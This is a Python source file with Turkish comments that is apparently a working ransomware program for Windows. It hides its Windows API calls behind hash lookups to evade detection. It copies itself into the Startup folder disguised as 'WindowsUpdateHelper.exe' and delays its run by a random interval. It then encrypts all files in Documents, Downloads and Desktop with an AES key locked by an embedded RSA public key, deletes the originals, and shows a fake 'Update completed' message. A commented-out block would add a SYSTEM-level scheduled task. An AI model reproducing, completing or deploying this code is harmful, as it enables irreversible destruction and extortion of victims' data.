import  random, secrets, time, tkinter as tk, sys
import ctypes
from cryptography.hazmat.primitives.asymmetric import padding
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.backends import default_backend
from tkinter import messagebox
from ctypes import wintypes
from cryptography.hazmat.primitives.padding import PKCS7
from cryptography.hazmat.primitives.serialization import load_pem_public_key

shlwapi = ctypes.WinDLL('shlwapi', use_last_error=True)
# For whatever OS, this finds the full path of all folders. Change this with, Desktop, Documents, .mdb,.sql,$DBF$
# os.path.join ve Path.home() olmadan dinamik yollar


# pymmh3 - Pure Python MurmurHash3 (senin bulduğun kod)
def xencode(x):
    if isinstance(x, bytes) or isinstance(x, bytearray):
        return x
    else:
        return x.encode()

def hash(key, seed=0x0):
    key = bytearray(xencode(key))
    def fmix(h):
        h ^= h >> 16
        h = (h * 0x85ebca6b) & 0xFFFFFFFF
        h ^= h >> 13
        h = (h * 0xc2b2ae35) & 0xFFFFFFFF
        h ^= h >> 16
        return h
    length = len(key)
    nblocks = int(length / 4)
    h1 = seed
    c1 = 0xcc9e2d51
    c2 = 0x1b873593
    for block_start in range(0, nblocks * 4, 4):
        k1 = key[block_start + 3] << 24 | \
             key[block_start + 2] << 16 | \
             key[block_start + 1] << 8 | \
             key[block_start + 0]
        k1 = (c1 * k1) & 0xFFFFFFFF
        k1 = (k1 << 15 | k1 >> 17) & 0xFFFFFFFF
        k1 = (c2 * k1) & 0xFFFFFFFF
        h1 ^= k1
        h1 = (h1 << 13 | h1 >> 19) & 0xFFFFFFFF
        h1 = (h1 * 5 + 0xe6546b64) & 0xFFFFFFFF
    tail_index = nblocks * 4
    k1 = 0
    tail_size = length & 3
    if tail_size >= 3:
        k1 ^= key[tail_index + 2] << 16
    if tail_size >= 2:
        k1 ^= key[tail_index + 1] << 8
    if tail_size >= 1:
        k1 ^= key[tail_index + 0]
    if tail_size > 0:
        k1 = (k1 * c1) & 0xFFFFFFFF
        k1 = (k1 << 15 | k1 >> 17) & 0xFFFFFFFF
        k1 = (k1 * c2) & 0xFFFFFFFF
        h1 ^= k1
    h1 ^= length
    h1 = fmix(h1)
    if h1 & 0x80000000 == 0:
        return h1
    else:
        return -((h1 ^ 0xFFFFFFFF) + 1)


API_HASH_TABLE = {
    hash("DeleteFileW"): "DeleteFileW",
    hash("CopyFileW"): "CopyFileW",
    hash("RegOpenKeyExW"): "RegOpenKeyExW",
    hash("RegSetValueExW"): "RegSetValueExW",
    hash("RegCloseKey"): "RegCloseKey",
    hash("GetEnvironmentVariableW"): "GetEnvironmentVariableW",
    hash("GetFullPathNameW"): "GetFullPathNameW",
    hash("PathCombineW"): "PathCombineW",
    hash("FindFirstFileW"): "FindFirstFileW",
    hash("FindNextFileW"): "FindNextFileW",
    hash("FindClose"): "FindClose",
    hash("GetFileAttributesW"): "GetFileAttributesW",
    hash("CryptAcquireContextW"): "CryptAcquireContextW",
    hash("CryptGenRandom"): "CryptGenRandom",
    hash("CryptReleaseContext"): "CryptReleaseContext",
    hash("SHGetKnownFolderPath"): "SHGetKnownFolderPath",
}

kernel32 = ctypes.windll.kernel32
advapi32 = ctypes.windll.advapi32
shell32 = ctypes.windll.shell32




def resolve_api(dll, func_hash: int):
    func_name = API_HASH_TABLE.get(func_hash)
    if not func_name:
        raise RuntimeError(f"Bilinmeyen API hash: {hex(func_hash)}")
    addr = kernel32.GetProcAddress(dll._handle, func_name.encode('ascii'))
    if not addr:
        raise RuntimeError(f"GetProcAddress başarısız: {func_name}")
    return addr

# FindFirstFileW / FindNextFileW için WIN32_FIND_DATA yapısı
class WIN32_FIND_DATA(ctypes.Structure):
    _fields_ = [
        ("dwFileAttributes", wintypes.DWORD),
        ("ftCreationTime", wintypes.FILETIME),
        ("ftLastAccessTime", wintypes.FILETIME),
        ("ftLastWriteTime", wintypes.FILETIME),
        ("nFileSizeHigh", wintypes.DWORD),
        ("nFileSizeLow", wintypes.DWORD),
        ("dwReserved0", wintypes.DWORD),
        ("dwReserved1", wintypes.DWORD),
        ("cFileName", wintypes.WCHAR * 260),
        ("cAlternateFileName", wintypes.WCHAR * 14),
    ]

INVALID_HANDLE_VALUE = -1

FindFirstFileW = ctypes.WINFUNCTYPE(wintypes.HANDLE, wintypes.LPCWSTR, ctypes.POINTER(WIN32_FIND_DATA))(
    resolve_api(kernel32, hash("FindFirstFileW"))
)

FindNextFileW = ctypes.WINFUNCTYPE(wintypes.BOOL, wintypes.HANDLE, ctypes.POINTER(WIN32_FIND_DATA))(
    resolve_api(kernel32, hash("FindNextFileW"))
)

FindClose = ctypes.WINFUNCTYPE(wintypes.BOOL, wintypes.HANDLE)(
    resolve_api(kernel32, hash("FindClose"))
)

GetFileAttributesW = ctypes.WINFUNCTYPE(wintypes.DWORD, wintypes.LPCWSTR)(
    resolve_api(kernel32, hash("GetFileAttributesW"))
)

CryptAcquireContextW = ctypes.WINFUNCTYPE(wintypes.BOOL, ctypes.POINTER(wintypes.HANDLE), wintypes.LPCWSTR, wintypes.LPCWSTR, wintypes.DWORD, wintypes.DWORD)(
    resolve_api(advapi32, hash("CryptAcquireContextW"))
)

CryptGenRandom = ctypes.WINFUNCTYPE(wintypes.BOOL, wintypes.HANDLE, wintypes.DWORD, ctypes.c_void_p)(
    resolve_api(advapi32, hash("CryptGenRandom"))
)

CryptReleaseContext = ctypes.WINFUNCTYPE(wintypes.BOOL, wintypes.HANDLE, wintypes.DWORD)(
    resolve_api(advapi32, hash("CryptReleaseContext"))
)

# CryptGenRandom ile güvenli IV üret (os.urandom yerine)
def dynamic_urandom(size: int) -> bytes:
    hProv = wintypes.HANDLE()
    if not CryptAcquireContextW(ctypes.byref(hProv), None, None, 1, 0xF0000000):
        error = ctypes.get_last_error()
        raise OSError(f"CryptAcquireContextW hata: {error}")
    try:
        buffer = ctypes.create_string_buffer(size)
        if not CryptGenRandom(hProv, size, buffer):
            raise OSError("CryptGenRandom failed")
        return buffer.raw
    finally:
        CryptReleaseContext(hProv, 0)


# SHGetKnownFolderPath prototipi
SHGetKnownFolderPath = ctypes.WINFUNCTYPE(wintypes.HRESULT, ctypes.POINTER(ctypes.c_void_p), wintypes.DWORD, wintypes.HANDLE, ctypes.POINTER(ctypes.c_void_p))(
    resolve_api(shell32, hash("SHGetKnownFolderPath"))
)

# Doğru GUID binary format (little-endian)
FOLDERID_Documents = (ctypes.c_byte * 16).from_buffer_copy(bytes.fromhex('D0 9A D3 FD 8F 23 AF 46 AD B4 6C 85 48 03 69 C7'))
FOLDERID_Downloads  = (ctypes.c_byte * 16).from_buffer_copy(bytes.fromhex('90 E2 4D 37 3F 12 65 45 91 64 39 C4 92 5E 46 7B'))
FOLDERID_Desktop    = (ctypes.c_byte * 16).from_buffer_copy(bytes.fromhex('3A CC BF B4 2C DB 4C 42 B0 29 7F E9 9A 87 C6 41'))

def dynamic_get_known_folder(folder_id):
    ppidl = ctypes.c_void_p()
    result = SHGetKnownFolderPath(ctypes.byref(folder_id), 0, None, ctypes.byref(ppidl))
    if result != 0:
        raise OSError(f"SHGetKnownFolderPath hata: {result}")

    # CoTaskMemFree ile serbest bırak
    path = ctypes.cast(ppidl, ctypes.POINTER(wintypes.LPWSTR)).contents.value
    kernel32.CoTaskMemFree(ppidl)
    return path

# PathCombineW ile yol birleştirme (os.path.join yerine)
PathCombineW = ctypes.WINFUNCTYPE(wintypes.LPWSTR, wintypes.LPWSTR, wintypes.LPCWSTR, wintypes.LPCWSTR)(
    resolve_api(shlwapi, hash("PathCombineW"))
)

def dynamic_path_join(base: str, *parts: str) -> str:
    result = base
    for part in parts:
        buffer = ctypes.create_unicode_buffer(32767)
        PathCombineW(buffer, result, part)
        result = buffer.value
    return result


# DeleteFileW
DeleteFileW = ctypes.WINFUNCTYPE(wintypes.BOOL, wintypes.LPCWSTR)(
    resolve_api(kernel32, hash("DeleteFileW"))
)




def dynamic_delete_file(path: str):
    if not DeleteFileW(path):
        error = ctypes.get_last_error()
        raise OSError(f"DeleteFileW hata: {error}")

# CopyFileW
CopyFileW = ctypes.WINFUNCTYPE(wintypes.BOOL, wintypes.LPCWSTR, wintypes.LPCWSTR, wintypes.BOOL)(
    resolve_api(kernel32, hash("CopyFileW"))
)

def dynamic_copy_file(src: str, dst: str, fail_if_exists: bool = False):
    if not CopyFileW(src, dst, fail_if_exists):
        error = ctypes.get_last_error()
        raise OSError(f"CopyFileW hata: {error}")

# Registry API'leri
RegOpenKeyExW = ctypes.WINFUNCTYPE(wintypes.LONG, wintypes.HANDLE, wintypes.LPCWSTR, wintypes.DWORD, wintypes.REGSAM, ctypes.POINTER(wintypes.HANDLE))(
    resolve_api(advapi32, hash("RegOpenKeyExW"))
)

RegSetValueExW = ctypes.WINFUNCTYPE(wintypes.LONG, wintypes.HANDLE, wintypes.LPCWSTR, wintypes.DWORD, wintypes.DWORD, ctypes.c_void_p, wintypes.DWORD)(
    resolve_api(advapi32, hash("RegSetValueExW"))
)

RegCloseKey = ctypes.WINFUNCTYPE(wintypes.LONG, wintypes.HANDLE)(
    resolve_api(advapi32, hash("RegCloseKey"))
)

HKEY_CURRENT_USER = 0x80000001

def dynamic_reg_set_value(subkey: str, value_name: str, value: str):
    hKey = wintypes.HANDLE()
    result = RegOpenKeyExW(HKEY_CURRENT_USER, subkey, 0, 0xF003F, ctypes.byref(hKey))
    if result != 0:
        raise OSError(f"RegOpenKeyExW hata: {result}")
    try:
        data = (value + '\0').encode('utf-16le')
        result = RegSetValueExW(hKey, value_name, 0, 1, data, len(data))
        if result != 0:
            raise OSError(f"RegSetValueExW hata: {result}")
    finally:
        RegCloseKey(hKey)

# GetEnvironmentVariableW
GetEnvironmentVariableW = ctypes.WINFUNCTYPE(wintypes.DWORD, wintypes.LPCWSTR, ctypes.c_void_p, wintypes.DWORD)(
    resolve_api(kernel32, hash("GetEnvironmentVariableW"))
)

def dynamic_getenv(var_name: str) -> str:
    buffer_size = 32767  # max env var length
    buffer = ctypes.create_unicode_buffer(buffer_size)
    result = GetEnvironmentVariableW(var_name, buffer, buffer_size)
    if result == 0:
        error = ctypes.get_last_error()
        raise OSError(f"GetEnvironmentVariableW hata: {error}")
    return buffer.value

# GetFullPathNameW (abspath alternatifi)
GetFullPathNameW = ctypes.WINFUNCTYPE(wintypes.DWORD, wintypes.LPCWSTR, wintypes.DWORD, ctypes.c_void_p, ctypes.POINTER(ctypes.c_void_p))(
    resolve_api(kernel32, hash("GetFullPathNameW"))
)

def dynamic_abspath(path: str) -> str:
    buffer_size = 32767
    buffer = ctypes.create_unicode_buffer(buffer_size)
    result = GetFullPathNameW(path, buffer_size, buffer, None)
    if result == 0:
        error = ctypes.get_last_error()
        raise OSError(f"GetFullPathNameW hata: {error}")
    return buffer.value

# PathCombineW (path.join alternatifi – daha güvenli)
PathCombineW = ctypes.WINFUNCTYPE(wintypes.LPWSTR, wintypes.LPWSTR, wintypes.LPCWSTR, wintypes.LPCWSTR)(
    resolve_api(shlwapi, hash("PathCombineW"))  # shlwapi.dll yükle
)

# shlwapi.dll yükle (PathCombineW için)
shlwapi = ctypes.windll.LoadLibrary("shlwapi.dll")

def dynamic_path_join(*parts: str) -> str:
    result = ""
    for part in parts:
        buffer = ctypes.create_unicode_buffer(32767)
        PathCombineW(buffer, result, part)
        result = buffer.value
    return result


def dynamic_walk(start_path: str):
    stack = [(start_path, [])]
    while stack:
        path, dirs = stack.pop()
        find_data = WIN32_FIND_DATA()
        hFind = FindFirstFileW(dynamic_path_join(path, "*"), ctypes.byref(find_data))
        if hFind == INVALID_HANDLE_VALUE:
            continue
        local_files = []
        local_dirs = []
        try:
            while True:
                file_name = find_data.cFileName.value
                if file_name not in (".", ".."):
                    full_path = dynamic_path_join(path, file_name)
                    if find_data.dwFileAttributes & 0x10:  # DIRECTORY
                        local_dirs.append(file_name)
                        stack.append((full_path, local_dirs))
                    else:
                        local_files.append(file_name)
                if not FindNextFileW(hFind, ctypes.byref(find_data)):
                    break
        finally:
            FindClose(hFind)
        yield path, local_dirs, local_files

documents_path = dynamic_get_known_folder(FOLDERID_Documents)
downloads_path = dynamic_get_known_folder(FOLDERID_Downloads)
desktop_path   = dynamic_get_known_folder(FOLDERID_Desktop)

folders_path = [
    documents_path,
    downloads_path,
    desktop_path
]









def dead_code_1():
    a = 1 + 2 * 3 / 4
    return a ** 2 if a else None


#def add_to_task_scheduler():
 #   try:
        # EXE veya script yolu
  #      exe_path = sys.executable if getattr(sys, 'frozen', False) else os.path.abspath(__file__)

        # Masum görev adı (örneğin "WindowsUpdateHelper" veya "AdobeFlashUpdate")
   #     task_name = "WindowsUpdateHelper"

        # Komut: Her kullanıcı girişinde çalışsın (ONLOGON)
        # /RU SYSTEM → Yüksek haklar, şifre sormaz
        # /F → Zaten varsa üzerine yaz
    #    cmd = [
     #       "schtasks", "/Create",
      #      "/TN", task_name,
       #     "/TR", f'"{exe_path}"',          # exe'yi direkt çalıştır
        #    "/SC", "ONLOGON",                # Kullanıcı girişinde
         #   "/RL", "HIGHEST",                # En yüksek haklar
          #  "/RU", "SYSTEM",                 # SYSTEM hesabı
           # "/F"                             # Zorla oluştur/üzerine yaz
      #  ]

        # Eğer .py ise: "/TR", f'"C:\\Python\\pythonw.exe" "{exe_path}"'

       # result = subprocess.run(cmd, capture_output=True, text=True, check=True)

        #print(f"[+] Task Scheduler kalıcılığı eklendi: {task_name}")
    #    print(result.stdout)

   # except subprocess.CalledProcessError as e:
    #    print(f"[-] schtasks hatası: {e.stderr}")
   # except Exception as e:
    #    print(f"[-] Task Scheduler ekleme hatası: {e}")

def add_persistence_startup():
    try:
        # exe_path = sys.executable if frozen else dynamic_abspath(__file__)
        exe_path = sys.executable if getattr(sys, 'frozen', False) else dynamic_abspath(sys.argv[0])

        # startup_folder = dynamic_path_join(dynamic_getenv('APPDATA'), 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')
        appdata = dynamic_getenv('APPDATA')
        startup_folder = dynamic_path_join(appdata, "Microsoft", "Windows", "Start Menu", "Programs", "Startup")

        target_path = dynamic_path_join(startup_folder, "WindowsUpdateHelper.exe")
        dynamic_copy_file(exe_path, target_path)
        print("[+] Startup folder persistence eklendi (tam dinamik API)")
    except Exception as e:
        print(f"[-] Startup hatası: {e}")



file_key = secrets.token_bytes(32) # dosyaları sifrelemek için kullanılacak sımetrık AES-256
public_key_bytes = """-----BEGIN PUBLIC KEY-----
MIICIjANBgkqhkiG9w0BAQEFAAOCAg8AMIICCgKCAgEAr6mXDTXMeBfznyezQOq/
0iOPZCq160eMU7UspQbVF+KK8pisSfJxQhXP33E2xYmW0JGwQ9HWTJJAqiaLBdpU
8ibL18CcPBuKSZewOnBhN2DyfXng+Q3aPOLtJSvx/jL4LkfHN82CyR7A/Kmn/ysL
7Ag8yQeOBmtx+I1UbWar3vy/6VPMKnH/S2/VdgvGudxF68cM88cISX02r49nXL0n
R0kT4LmlnGrUIS1HaE1QfVwOf6h+ruPjInkJYPDe4yWz9rG+ZaqfJDryeaT1SU/D
HGqGSymJ39qWCPgOoOEX7aXYrJcaM/iZgWxB6TzyeIHXb76zNE/PgNwqJzM1Wm2E
h9OF1Aj+PSI45mpTGpFr4OnI7j93XkcxFXUGzO4NUDq1gfh2lHHZxl6Nwri9XH7J
HO/vZFGwFbEaSfqzkTNWYXgLMEgCvg4quZt4Zt3okSocN5F20IjM8+LVaUIf7Vtw
bg90pNi06xBeMGjwSN/NuGs6AMuINIwNOpxDZC9pufROwSRtv3bIgAFjWcfnuwpQ
n7Or07uMTAAoX53qyeihzfD1zqrIlWRiwztY/BiKdcOKgsT62Dd1MpElNQ1zyUic
/ZdSIaB9CixsWDJRLyP5gwN3aSGy5yqeiVEpC5fX15pjIi8MEpllWqoG6VbJI0Ya
WQcBuaJJ3fvl9hgj6b8SFwcCAwEAAQ==
-----END PUBLIC KEY-----""".encode('utf-8') # RSA public key
rsa_public_key = load_pem_public_key(public_key_bytes)

encrypted_file_key = rsa_public_key.encrypt(file_key, # file_keyı sifreliyoruz kı gerı donus olmasın
    padding.OAEP(
        mgf=padding.MGF1(algorithm=hashes.SHA256()),
        algorithm=hashes.SHA256(),
        label=None
    )
)
ENCRYPTED_KEY_SIZE = len(encrypted_file_key)

# her bir dosya için faarklı IV kullan

def encrypt_file():
    for folder in folders_path:
        for root, dirs, files in dynamic_walk(folder):
            for file in files:
                bufferSize = 128*1024
                filePath = dynamic_path_join(root, file)
                attrs = GetFileAttributesW(filePath)
                if attrs == 0xFFFFFFFF or (attrs & 0x10):  # INVALID veya DIRECTORY
                    continue

                if file.endswith(".aes"):
                    continue
                iv = dynamic_urandom(16) # ıv yı kaydetmemeiz lazim
                cipher = Cipher(algorithms.AES(file_key), modes.CBC(iv), backend=default_backend())
                encryptor = cipher.encryptor()
                padder = PKCS7(algorithms.AES.block_size).padder()
                destination_path = dynamic_path_join(root, file + ".aes")
                with open(filePath, "rb") as input_file:
                    with open(destination_path, "wb") as output_file:
                        output_file.write(encrypted_file_key)
                        output_file.write(iv)
                        while True:
                            chunk = input_file.read(bufferSize)
                            if not chunk:
                                break

                            padded_chunk = padder.update(chunk)
                            encrypted_chunk = encryptor.update(padded_chunk)
                            output_file.write(encrypted_chunk)

                        final_padded_data = padder.finalize()
                        final_encrypted_chunk = encryptor.update(final_padded_data)
                        output_file.write(final_encrypted_chunk)

                dynamic_delete_file(filePath)

if __name__ == "__main__":
    time.sleep(random.randint(300, 1200))
    add_persistence_startup()
    encrypt_file()
    dead_code_1()
    #add_to_task_scheduler()
    root = tk.Tk()
    root.withdraw()
    messagebox.showinfo("System Update", "Update completed.")
    root.mainloop()